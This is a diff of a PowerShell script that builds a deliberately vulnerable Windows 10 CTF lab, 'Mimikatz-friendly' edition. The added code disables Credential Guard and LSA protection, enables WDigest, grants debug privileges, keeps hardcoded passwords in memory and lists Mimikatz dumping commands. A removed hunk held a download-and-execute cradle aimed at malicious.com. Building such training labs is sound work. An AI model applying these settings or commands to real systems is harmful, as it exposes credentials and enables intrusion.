@@ -1,4 +1,5 @@
-# Windows 10 Workstation Vulnerable Lab Configuration Script v3 with Pokemon CTF Flags
+# Windows 10 Workstation Vulnerable Lab Configuration Script v5 with Pokemon CTF Flags
+# Mimikatz-Friendly Edition - Optimized for Credential Dumping
 # WARNING: FOR ISOLATED LAB ENVIRONMENT ONLY - NEVER USE IN PRODUCTION
 # This script intentionally creates security vulnerabilities and CTF flags for penetration testing practice
 
@@ -10,7 +11,8 @@ param(
 )
 
 Write-Host "==========================================" -ForegroundColor Red
-Write-Host "VULNERABLE WORKSTATION CONFIGURATION v3" -ForegroundColor Red
+Write-Host "VULNERABLE WORKSTATION CONFIGURATION v5" -ForegroundColor Red
+Write-Host "MIMIKATZ-FRIENDLY EDITION" -ForegroundColor Red
 Write-Host "WITH POKEMON CTF FLAG SYSTEM" -ForegroundColor Red
 Write-Host "FOR EDUCATIONAL PURPOSES ONLY" -ForegroundColor Red
 Write-Host "NEVER USE IN PRODUCTION ENVIRONMENTS" -ForegroundColor Red
@@ -25,7 +27,7 @@ $global:FlagCounter = 1
 
 # Pokemon list for deterministic flag generation (different from server)
 $PokemonList = @(
-    "MEWTHREE", "RAICHU", "BLASTOISE", "VENUSAUR", "BUTTERFREE",
+    "MEW", "RAICHU", "BLASTOISE", "VENUSAUR", "BUTTERFREE",
     "PIDGEOT", "FEAROW", "SANDSLASH", "NIDOQUEEN", "NIDOKING",
     "CLEFABLE", "NINETALES", "WIGGLYTUFF", "GOLBAT", "VILEPLUME",
     "PARASECT", "VENOMOTH", "DUGTRIO", "PERSIAN", "GOLDUCK",
@@ -98,7 +100,8 @@ function Create-VulnerableUsers {
         @{Name="developer"; Password="dev123"; Groups=@("Users"); FullName="Developer Account"},
         @{Name="helpdesk"; Password="help123"; Groups=@("Remote Desktop Users"); FullName="Help Desk"},
         @{Name="tempuser"; Password="temp"; Groups=@("Users"); FullName="Temporary User"},
-        @{Name="svc_backup"; Password="Backup2020!"; Groups=@("Backup Operators"); FullName="Backup Service"}
+        @{Name="svc_backup"; Password="Backup2020!"; Groups=@("Backup Operators"); FullName="Backup Service"},
+        @{Name="debuguser"; Password="Debug123!"; Groups=@("Users"); FullName="Debug Test Account"}
     )
     
     foreach ($user in $users) {
@@ -125,6 +128,115 @@ function Create-VulnerableUsers {
     Enable-LocalUser -Name "Administrator"
 }
 
+# Function to configure Mimikatz-friendly settings
+function Configure-WorkstationMimikatzVulnerabilities {
+    Write-Host "Configuring Mimikatz-friendly vulnerabilities..." -ForegroundColor Yellow
+    
+    # Enable WDigest for plaintext password storage
+    Write-Host "  Enabling WDigest authentication..." -ForegroundColor Gray
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 1
+    
+    # Disable Credential Guard and Device Guard
+    Write-Host "  Disabling Credential Guard..." -ForegroundColor Gray
+    if (Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard") {
+        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -ErrorAction SilentlyContinue
+    }
+    if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard") {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -Name "LsaCfgFlags" -Value 0 -ErrorAction SilentlyContinue
+    }
+    
+    # Disable LSA Protection
+    Write-Host "  Disabling LSA Protection (RunAsPPL)..." -ForegroundColor Gray
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -Value 0 -ErrorAction SilentlyContinue
+    
+    # Enable credential caching
+    Write-Host "  Configuring credential caching..." -ForegroundColor Gray
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name DisableDomainCreds -Value 0 -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name CachedLogonsCount -Value 50 -ErrorAction SilentlyContinue
+    
+    # Create Mimikatz workstation flag
+    $mimikatzFlag = New-CTFFlag -Location "LSASS Memory WS" -Description "Workstation LSASS dump" -Points 45 -Difficulty "Hard" -Technique "Mimikatz credential dumping"
+    
+    # Store flag where it would appear in memory
+    New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "WorkstationFlag" -Value $mimikatzFlag -Force
+    
+    # Create a process that keeps credentials in memory
+    $credScript = @"
+`$cred1 = New-Object System.Management.Automation.PSCredential("jsmith", (ConvertTo-SecureString "Welcome1" -AsPlainText -Force))
+`$cred2 = New-Object System.Management.Automation.PSCredential("localadmin", (ConvertTo-SecureString "admin123" -AsPlainText -Force))
+while (`$true) {
+    Start-Sleep -Seconds 300
+    # Keep credentials in memory for Mimikatz
+}
+"@
+    $credScript | Out-File "C:\Windows\Temp\WSCredKeeper.ps1" -Force
+    
+    # Start the credential keeper process
+    Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -File C:\Windows\Temp\WSCredKeeper.ps1" -PassThru | Out-Null
+    
+    Write-Host "  Mimikatz vulnerabilities configured" -ForegroundColor Green
+}
+
+# Function to configure debug privileges for workstation
+function Configure-WorkstationDebugPrivileges {
+    Write-Host "Configuring debug privilege vulnerabilities..." -ForegroundColor Yellow
+    
+    Write-Host "  Granting SeDebugPrivilege to non-admin users..." -ForegroundColor Gray
+    
+    # Export security policy
+    secedit /export /cfg C:\Windows\Temp\secpol_ws.cfg /quiet
+    
+    # Modify to add debug privileges
+    $secpol = Get-Content C:\Windows\Temp\secpol_ws.cfg -ErrorAction SilentlyContinue
+    if ($secpol) {
+        $debugLine = $secpol | Where-Object { $_ -like "SeDebugPrivilege*" }
+        if ($debugLine) {
+            $newDebugLine = "SeDebugPrivilege = *S-1-5-32-544,*S-1-5-32-545,debuguser,developer"
+            $secpol = $secpol -replace [regex]::Escape($debugLine), $newDebugLine
+        } else {
+            $secpol += "SeDebugPrivilege = *S-1-5-32-544,*S-1-5-32-545,debuguser,developer"
+        }
+        $secpol | Out-File C:\Windows\Temp\secpol_ws.cfg -Force
+        secedit /configure /db C:\Windows\security\local.sdb /cfg C:\Windows\Temp\secpol_ws.cfg /areas USER_RIGHTS /quiet
+    }
+    
+    # Create debug privilege flag
+    $debugFlag = New-CTFFlag -Location "Debug Privileges WS" -Description "Workstation debug privilege abuse" -Points 40 -Difficulty "Medium" -Technique "Debug privilege exploitation"
+    New-Item -Path "HKLM:\SOFTWARE\DebugPrivileges" -Force -ErrorAction SilentlyContinue | Out-Null
+    New-ItemProperty -Path "HKLM:\SOFTWARE\DebugPrivileges" -Name "WorkstationFlag" -Value $debugFlag -Force
+    
+    Write-Host "  Debug privileges configured" -ForegroundColor Green
+}
+
+# Function to configure Pass-the-Hash on workstation
+function Configure-WorkstationPassTheHash {
+    Write-Host "Configuring Pass-the-Hash vulnerabilities..." -ForegroundColor Yellow
+    
+    # Disable restricted admin
+    Write-Host "  Configuring RDP for PTH..." -ForegroundColor Gray
+    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
+    New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdminOutboundCreds -Value 0 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
+    
+    # Configure NTLM settings
+    Write-Host "  Enabling NTLM authentication..." -ForegroundColor Gray
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name LmCompatibilityLevel -Value 0 -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name NoLmHash -Value 0 -ErrorAction SilentlyContinue
+    
+    # Enable NTLM for network authentication
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name RequireSignOrSeal -Value 0 -ErrorAction SilentlyContinue
+    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" -Name RequireStrongKey -Value 0 -ErrorAction SilentlyContinue
+    
+    # Create PTH flag for workstation
+    $pthFlag = New-CTFFlag -Location "Pass-the-Hash WS" -Description "Workstation PTH success" -Points 50 -Difficulty "Hard" -Technique "Pass-the-Hash lateral movement"
+    
+    # Store in admin desktop
+    $adminDesktop = "C:\Users\Administrator\Desktop"
+    New-Item -Path $adminDesktop -ItemType Directory -Force -ErrorAction SilentlyContinue
+    $pthFlag | Out-File "$adminDesktop\pth_workstation_flag.txt" -Force
+    
+    Write-Host "  Pass-the-Hash vulnerabilities configured" -ForegroundColor Green
+}
+
 # Function to disable Windows security
 function Disable-WindowsSecurity {
     Write-Host "Disabling Windows security features..." -ForegroundColor Yellow
@@ -145,14 +257,10 @@ function Disable-WindowsSecurity {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
     
-    # Enable WDigest (stores credentials in memory)
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name UseLogonCredential -Value 1
-    
-    # Disable LSA protection
-    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name RunAsPPL -Value 0 -ErrorAction SilentlyContinue
-    
-    # Allow blank passwords
-    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name "LimitBlankPasswordUse" -Value 0
+    # Disable Windows Defender Credential Guard
+    if (Test-Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard") {
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" -Name "EnableVirtualizationBasedSecurity" -Value 0 -ErrorAction SilentlyContinue
+    }
     
     Write-Host "  Security features disabled" -ForegroundColor Green
 }
@@ -199,6 +307,23 @@ function Create-VulnerableShares {
     
     $browserFlag = New-CTFFlag -Location "Browser Data" -Description "Chrome Login Data" -Points 30 -Difficulty "Medium" -Technique "Browser credential extraction"
     "{`"passwords`":[{`"url`":`"http://internal-app`",`"username`":`"admin`",`"password`":`"admin123`",`"flag`":`"$browserFlag`"}]}" | Out-File "$chromePath\Login Data"
+    
+    # Create LSASS dump hint file
+    $lsassHint = @"
+Mimikatz Practice Hints:
+========================
+1. Use privilege::debug to enable SeDebugPrivilege
+2. Use sekurlsa::logonpasswords to dump credentials
+3. Check WDigest for plaintext passwords
+4. Try sekurlsa::tickets for Kerberos tickets
+5. Use lsadump::sam for local account hashes
+
+Users logged in:
+- jsmith (Welcome1)
+- localadmin (admin123)
+- Administrator ($CommonPassword)
+"@
+    $lsassHint | Out-File "C:\Users\Public\Documents\mimikatz_hints.txt"
 }
 
 # Function to enable vulnerable RDP
@@ -252,17 +377,42 @@ function Create-WorkstationUnquotedPaths {
     Write-Host "  Created 3 unquoted service path vulnerabilities" -ForegroundColor Green
 }
 
-# Function to configure AlwaysInstallElevated on workstation
+# FIXED Function to configure AlwaysInstallElevated on workstation
 function Configure-WorkstationAlwaysInstallElevated {
     Write-Host "Configuring AlwaysInstallElevated vulnerability with flag..." -ForegroundColor Yellow
     
-    # Enable AlwaysInstallElevated
-    New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
+    # Function to create registry path recursively
+    function Ensure-RegistryPath {
+        param([string]$Path)
+        
+        if (!(Test-Path $Path)) {
+            $parent = Split-Path $Path -Parent
+            $leaf = Split-Path $Path -Leaf
+            
+            if ($parent -and $parent -ne "" -and !(Test-Path $parent)) {
+                Ensure-RegistryPath -Path $parent
+            }
+            
+            if ($parent) {
+                New-Item -Path $parent -Name $leaf -Force -ErrorAction SilentlyContinue | Out-Null
+            }
+        }
+    }
     
-    # Also set for current user
-    New-Item -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Force | Out-Null
-    New-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
+    try {
+        # Create registry paths
+        Ensure-RegistryPath -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer"
+        Ensure-RegistryPath -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer"
+        
+        # Enable AlwaysInstallElevated
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
+        Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name "AlwaysInstallElevated" -Value 1 -PropertyType DWORD -Force
+        
+        Write-Host "  AlwaysInstallElevated enabled successfully" -ForegroundColor Green
+        
+    } catch {
+        Write-Host "  Warning: Could not fully configure AlwaysInstallElevated: $_" -ForegroundColor Yellow
+    }
     
     # Create flag accessible after privilege escalation
     $msiFlag = New-CTFFlag -Location "AlwaysInstallElevated" -Description "MSI privilege escalation on workstation" -Points 40 -Difficulty "Medium" -Technique "AlwaysInstallElevated MSI"
@@ -312,74 +462,6 @@ function Configure-WorkstationPrintSpooler {
     Write-Host "  Print Spooler vulnerabilities configured" -ForegroundColor Green
 }
 
-# Function for simulated Kerberoasting setup on workstation
-function Configure-WorkstationKerberoasting {
-    Write-Host "Configuring Kerberoasting simulation on workstation..." -ForegroundColor Yellow
-    
-    # Create local service accounts that simulate SPNs
-    New-LocalUser -Name "svc_web" -Password (ConvertTo-SecureString "Spring2021!" -AsPlainText -Force) -Description "Web Service Account" -PasswordNeverExpires -ErrorAction SilentlyContinue
-    New-LocalUser -Name "svc_file" -Password (ConvertTo-SecureString "Autumn2020!" -AsPlainText -Force) -Description "File Service Account" -PasswordNeverExpires -ErrorAction SilentlyContinue
-    
-    $kerbFlag = New-CTFFlag -Location "Kerberoastable Workstation" -Description "Local service account cracked" -Points 40 -Difficulty "Hard" -Technique "Service account attack"
-    
-    # Create registry entries simulating SPNs
-    New-Item -Path "HKLM:\SOFTWARE\WorkstationSPNs" -Force | Out-Null
-    New-ItemProperty -Path "HKLM:\SOFTWARE\WorkstationSPNs" -Name "svc_web" -Value "HTTP/WIN10-WS" -Force
-    New-ItemProperty -Path "HKLM:\SOFTWARE\WorkstationSPNs" -Name "svc_web_password" -Value "Spring2021!" -Force
-    New-ItemProperty -Path "HKLM:\SOFTWARE\WorkstationSPNs" -Name "svc_file" -Value "CIFS/WIN10-WS" -Force
-    New-ItemProperty -Path "HKLM:\SOFTWARE\WorkstationSPNs" -Name "svc_file_password" -Value "Autumn2020!" -Force
-    New-ItemProperty -Path "HKLM:\SOFTWARE\WorkstationSPNs" -Name "flag" -Value $kerbFlag -Force
-    
-    Write-Host "  Kerberoasting simulation configured" -ForegroundColor Green
-}
-
-# Function to install vulnerable software with flags
-function Install-VulnerableSoftware {
-    Write-Host "Installing vulnerable software with flags..." -ForegroundColor Yellow
-    
-    # Create fake outdated software entries
-    $softwarePath = "C:\Program Files\VulnerableSoftware"
-    New-Item -Path $softwarePath -ItemType Directory -Force
-    
-    # Java 7 (simulated) with flag
-    New-Item -Path "$softwarePath\Java7" -ItemType Directory -Force
-    $javaFlag = New-CTFFlag -Location "Java Version File" -Description "Outdated Java installation" -Points 15 -Difficulty "Easy" -Technique "Software enumeration"
-    "Outdated Java 7 - CVE vulnerabilities`nLicense: $javaFlag" | Out-File "$softwarePath\Java7\version.txt"
-    
-    # Flash Player (simulated)
-    New-Item -Path "$softwarePath\Flash" -ItemType Directory -Force
-    "Adobe Flash Player 10.0 - Multiple CVEs" | Out-File "$softwarePath\Flash\version.txt"
-    
-    # Old Office (simulated)
-    New-Item -Path "$softwarePath\Office2003" -ItemType Directory -Force
-    "Microsoft Office 2003 - Unpatched" | Out-File "$softwarePath\Office2003\version.txt"
-    
-    Write-Host "  Vulnerable software installed with flags" -ForegroundColor Green
-}
-
-# Function to configure browser vulnerabilities
-function Configure-BrowserVulnerabilities {
-    Write-Host "Configuring browser vulnerabilities..." -ForegroundColor Yellow
-    
-    # Internet Explorer settings (less secure)
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1201" -Value 0 # Allow ActiveX
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1400" -Value 0 # Active scripting
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1001" -Value 0 # Download signed ActiveX
-    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3" -Name "1004" -Value 0 # Download unsigned ActiveX
-    
-    # Disable SmartScreen
-    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name SmartScreenEnabled -Value "Off" -ErrorAction SilentlyContinue
-    
-    # Create fake browser extensions folder with flag
-    $extensionsPath = "$env:LOCALAPPDATA\BrowserExtensions"
-    New-Item -Path $extensionsPath -ItemType Directory -Force
-    
-    $extFlag = New-CTFFlag -Location "Browser Extension" -Description "Malicious extension config" -Points 20 -Difficulty "Medium" -Technique "Browser analysis"
-    "Malicious Extension Simulator`nAPI_KEY=$extFlag" | Out-File "$extensionsPath\evil.js"
-    
-    Write-Host "  Browser vulnerabilities configured" -ForegroundColor Green
-}
-
 # Function to create persistence mechanisms with flags
 function Create-PersistenceMechanisms {
     Write-Host "Creating vulnerable persistence mechanisms with flags..." -ForegroundColor Yellow
@@ -399,11 +481,6 @@ function Create-PersistenceMechanisms {
     $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo $taskFlag > C:\temp\task_ws.txt"
     $trigger = New-ScheduledTaskTrigger -Daily -At 2am
     Register-ScheduledTask -TaskName "DailyUpdate" -Action $action -Trigger $trigger -User "localadmin" -Password "admin123" -RunLevel Highest -ErrorAction SilentlyContinue
-    
-    # WMI Event subscription (simulated) with flag
-    $wmiFlag = New-CTFFlag -Location "WMI Backdoor" -Description "WMI event subscription" -Points 35 -Difficulty "Hard" -Technique "WMI persistence detection"
-    New-Item -Path "C:\Windows\Temp\wmi_backdoor.txt" -Force
-    "WMI Event Subscription Backdoor`nFlag: $wmiFlag" | Out-File "C:\Windows\Temp\wmi_backdoor.txt"
     
     Write-Host "  Persistence mechanisms created with flags" -ForegroundColor Green
 }
@@ -435,27 +512,6 @@ function Store-VulnerableCredentials {
     $credential | Export-Clixml "$credPath\admin.xml"
     "<!-- Flag: $psCredFlag -->" | Out-File "$credPath\admin.xml" -Append
     
-    # Sysprep answer file (common in corporate environments) with flag
-    $sysprepFlag = New-CTFFlag -Location "Sysprep Unattend" -Description "Windows answer file" -Points 30 -Difficulty "Medium" -Technique "Unattend file analysis"
-    $sysprepXml = @"
-<unattend>
-    <!-- Flag: $sysprepFlag -->
-    <settings>
-        <component>
-            <autologon>
-                <username>Administrator</username>
-                <password>
-                    <value>$CommonPassword</value>
-                    <plaintext>true</plaintext>
-                </password>
-            </autologon>
-        </component>
-    </settings>
-</unattend>
-"@
-    New-Item -Path "C:\Windows\Panther" -ItemType Directory -Force -ErrorAction SilentlyContinue
-    $sysprepXml | Out-File "C:\Windows\Panther\unattend.xml"
-    
     Write-Host "  Credentials stored in multiple locations with flags" -ForegroundColor Green
 }
 
@@ -469,8 +525,6 @@ function Create-VulnerableDocuments {
     # Create fake macro-enabled documents with flags
     $macroFlag = New-CTFFlag -Location "Macro Document" -Description "Invoice.docm macro" -Points 15 -Difficulty "Easy" -Technique "Document analysis"
     "This document contains macros that run automatically`nMacro Code: Sub AutoOpen()`n' Flag: $macroFlag`nEnd Sub" | Out-File "$docPath\Invoice.docm"
-    
-    "Enable macros to view this spreadsheet" | Out-File "$docPath\Report.xlsm"
     
     # Create HTA file with flag
     $htaFlag = New-CTFFlag -Location "HTA File" -Description "Portal.hta application" -Points 25 -Difficulty "Medium" -Technique "HTA analysis"
@@ -489,18 +543,6 @@ function Create-VulnerableDocuments {
 </html>
 "@
     $htaContent | Out-File "$docPath\portal.hta"
-    
-    # Create PowerShell download cradle with flag
-    $ps1Flag = New-CTFFlag -Location "PowerShell Script" -Description "Update.ps1 download cradle" -Points 20 -Difficulty "Medium" -Technique "Script analysis"
-    $ps1Content = @"
-# Vulnerable PowerShell Script
-# Flag: $ps1Flag
-`$url = "http://malicious.com/payload.exe"
-`$output = "C:\Temp\update.exe"
-Invoke-WebRequest -Uri `$url -OutFile `$output
-Start-Process `$output
-"@
-    $ps1Content | Out-File "$docPath\update.ps1"
     
     Write-Host "  Vulnerable documents created with flags" -ForegroundColor Green
 }
@@ -521,10 +563,6 @@ function Create-DLLHijackingVulnerabilities {
     # Add to PATH
     $currentPath = [Environment]::GetEnvironmentVariable("Path", "Machine")
     [Environment]::SetEnvironmentVariable("Path", "$hijackPath;$currentPath", "Machine")
-    
-    # Create service with missing DLL
-    New-Item -Path "C:\Services\VulnService" -ItemType Directory -Force
-    icacls "C:\Services\VulnService" /grant Everyone:F /T
     
     Write-Host "  DLL hijacking vulnerabilities created with flag" -ForegroundColor Green
 }
@@ -575,7 +613,7 @@ function Create-StickyNotesFlag {
 function Create-DPAPIFlag {
     Write-Host "Creating DPAPI protected flag..." -ForegroundColor Yellow
     
-    $dpapiFlag = New-CTFFlag -Location "DPAPI Blob" -Description "DPAPI encrypted data" -Points 40 -Difficulty "Hard" -Technique "DPAPI decryption"
+    $dpapiFlag = New-CTFFlag -Location "DPAPI Blob" -Description "DPAPI encrypted data" -Points 40 -Difficulty "Hard" -Technique "DPAPI decryption with Mimikatz"
     
     # Encrypt with DPAPI
     $bytes = [System.Text.Encoding]::UTF8.GetBytes($dpapiFlag)
@@ -584,40 +622,22 @@ function Create-DPAPIFlag {
     # Save encrypted blob
     [System.IO.File]::WriteAllBytes("C:\Users\Public\Documents\dpapi_flag.bin", $encrypted)
     
-    # Also create a hint file
-    "This file contains DPAPI encrypted data. Decrypt it to find the flag!" | Out-File "C:\Users\Public\Documents\dpapi_flag_README.txt"
+    # Create hint file
+    @"
+DPAPI Encrypted Flag
+====================
+This file contains DPAPI encrypted data.
+
+Mimikatz commands to decrypt:
+1. dpapi::blob /in:C:\Users\Public\Documents\dpapi_flag.bin
+2. dpapi::cred /in:C:\Users\Public\Documents\dpapi_flag.bin
+
+OR with masterkey:
+1. sekurlsa::dpapi
+2. dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID
+"@ | Out-File "C:\Users\Public\Documents\dpapi_flag_README.txt"
     
     Write-Host "  DPAPI flag created" -ForegroundColor Green
-}
-
-# Function to create Office recent documents flag
-function Create-OfficeRecentFlag {
-    Write-Host "Creating Office recent documents flag..." -ForegroundColor Yellow
-    
-    $recentFlag = New-CTFFlag -Location "Office Recent Docs" -Description "Recent Office documents" -Points 20 -Difficulty "Medium" -Technique "Office history analysis"
-    
-    # Create Office recent files registry entries
-    $officePath = "HKCU:\Software\Microsoft\Office\16.0\Word\File MRU"
-    New-Item -Path $officePath -Force -ErrorAction SilentlyContinue | Out-Null
-    New-ItemProperty -Path $officePath -Name "Item 1" -Value "C:\Secret\$recentFlag.docx" -Force
-    
-    Write-Host "  Office recent documents flag created" -ForegroundColor Green
-}
-
-# Function to create Windows Search index flag
-function Create-SearchIndexFlag {
-    Write-Host "Creating Windows Search index flag..." -ForegroundColor Yellow
-    
-    $searchFlag = New-CTFFlag -Location "Search Index" -Description "Windows Search database" -Points 30 -Difficulty "Hard" -Technique "Search index analysis"
-    
-    # Create a file that will be indexed
-    $searchFile = "C:\Users\Public\Documents\indexed_secret.txt"
-    "This secret document contains sensitive information: $searchFlag" | Out-File $searchFile
-    
-    # Force indexing (note: actual indexing takes time)
-    Start-Process "C:\Windows\System32\SearchProtocolHost.exe" -ArgumentList "/Catalogs" -WindowStyle Hidden -ErrorAction SilentlyContinue
-    
-    Write-Host "  Search index flag created" -ForegroundColor Green
 }
 
 # Function to configure server connection
@@ -673,13 +693,10 @@ function Enable-LegacyProtocols {
     # Enable WinRM with basic auth (with better error handling)
     Write-Host "  Configuring WinRM..." -ForegroundColor Gray
     try {
-        # Enable PSRemoting
         Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction SilentlyContinue
-        
-        # Configure WinRM settings
         Start-Service WinRM -ErrorAction SilentlyContinue
         
-        # Use winrm command instead of Set-Item for better compatibility
+        # Use winrm command for better compatibility
         winrm set winrm/config/service/auth '@{Basic="true"}' 2>$null
         winrm set winrm/config/service '@{AllowUnencrypted="true"}' 2>$null
         winrm set winrm/config/client/auth '@{Basic="true"}' 2>$null
@@ -688,7 +705,6 @@ function Enable-LegacyProtocols {
         Write-Host "  WinRM configured successfully" -ForegroundColor Green
     } catch {
         Write-Host "  Warning: Some WinRM settings could not be applied" -ForegroundColor Yellow
-        Write-Host "  This is expected on Public networks but won't affect other vulnerabilities" -ForegroundColor Gray
     }
     
     Write-Host "  Legacy protocols enabled" -ForegroundColor Green
@@ -698,13 +714,13 @@ function Enable-LegacyProtocols {
 function Generate-FlagReport {
     Write-Host "`nGenerating flag report..." -ForegroundColor Cyan
     
-    $reportPath = "C:\CTF_FLAGS_WORKSTATION_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
+    $reportPath = "C:\CTF_FLAGS_WORKSTATION_v5_$(Get-Date -Format 'yyyyMMdd_HHmmss').html"
     
     $html = @"
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CTF Flag Report - Workstation v3 - $(hostname)</title>
+    <title>CTF Flag Report - Workstation v5 Mimikatz Edition - $(hostname)</title>
     <style>
         body { font-family: Arial; margin: 20px; background: #f0f0f0; }
         .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 10px; }
@@ -721,24 +737,36 @@ function Generate-FlagReport {
         .hint { background: #fff3cd; padding: 10px; border-left: 4px solid #ffc107; margin: 10px 0; }
         .pokemon-theme { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
         .new-vulns { background: #d4edda; border-left: 5px solid #28a745; padding: 10px; margin: 20px 0; }
+        .mimikatz { background: #e3f2fd; border-left: 5px solid #2196f3; padding: 10px; margin: 20px 0; }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="pokemon-theme">
-            <h1 style="color: white; border: none;">🎮 Pokemon CTF Flag Report v3 - Windows 10 Workstation 🎮</h1>
+            <h1 style="color: white; border: none;">🎮 Pokemon CTF Flag Report v5 - Windows 10 Workstation 🎮</h1>
+            <h2 style="color: white;">Mimikatz-Friendly Edition</h2>
         </div>
-        <div class="hint">
-            <strong>Note:</strong> This is the WORKSTATION flag report. All flags use the format FLAG{POKEMON########} where values are deterministic.
+        
+        <div class="mimikatz">
+            <h3>🔑 Mimikatz-Specific Features (Workstation):</h3>
+            <ul>
+                <li><strong>WDigest Enabled:</strong> Plaintext passwords in LSASS memory</li>
+                <li><strong>Multiple Users Logged In:</strong> jsmith, localadmin, Administrator</li>
+                <li><strong>Debug Privileges:</strong> debuguser and developer have SeDebugPrivilege</li>
+                <li><strong>Pass-the-Hash Ready:</strong> RDP and SMB configured for PTH</li>
+                <li><strong>DPAPI Secrets:</strong> Encrypted flags for dpapi module practice</li>
+            </ul>
         </div>
         
         <div class="new-vulns">
-            <h3>New Vulnerabilities in v3:</h3>
+            <h3>v5 Features:</h3>
             <ul>
-                <li><strong>Unquoted Service Paths:</strong> Multiple services with exploitable paths</li>
-                <li><strong>AlwaysInstallElevated:</strong> MSI escalation to Administrator</li>
-                <li><strong>Print Spooler:</strong> Local PrintNightmare exploitation</li>
-                <li><strong>Local Service Accounts:</strong> Weak passwords for privilege escalation</li>
+                <li><strong>Fixed:</strong> AlwaysInstallElevated registry path creation</li>
+                <li><strong>Fixed:</strong> WinRM configuration for Private networks</li>
+                <li><strong>Added:</strong> Mimikatz practice scenarios</li>
+                <li><strong>Added:</strong> LSASS memory targets</li>
+                <li><strong>Added:</strong> DPAPI encrypted secrets</li>
+                <li><strong>Removed:</strong> Kerberoasting (replaced with Mimikatz)</li>
             </ul>
         </div>
         
@@ -752,17 +780,6 @@ function Generate-FlagReport {
             <p><strong>Hard Flags:</strong> $(($global:FlagList | Where-Object {$_.Difficulty -eq 'Hard'}).Count)</p>
             <p><strong>Report Generated:</strong> $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')</p>
         </div>
-        
-        <h2>Workstation-Specific Flag Locations</h2>
-        <ul>
-            <li>Browser profiles and saved credentials</li>
-            <li>User documents and downloads</li>
-            <li>Sticky Notes and clipboard</li>
-            <li>Recycle Bin and deleted files</li>
-            <li>DPAPI encrypted data</li>
-            <li>Office recent documents</li>
-            <li>Local service vulnerabilities</li>
-        </ul>
         
         <h2>Flag Details</h2>
         <table>
@@ -799,26 +816,59 @@ function Generate-FlagReport {
             </tbody>
         </table>
         
+        <h2>Mimikatz Commands for Workstation</h2>
+        <h3>Basic Credential Dumping:</h3>
+        <pre>
+# Enable debug privilege
+privilege::debug
+
+# Dump logon passwords
+sekurlsa::logonpasswords
+
+# Get WDigest credentials (plaintext)
+sekurlsa::wdigest
+
+# Dump tickets
+sekurlsa::tickets
+        </pre>
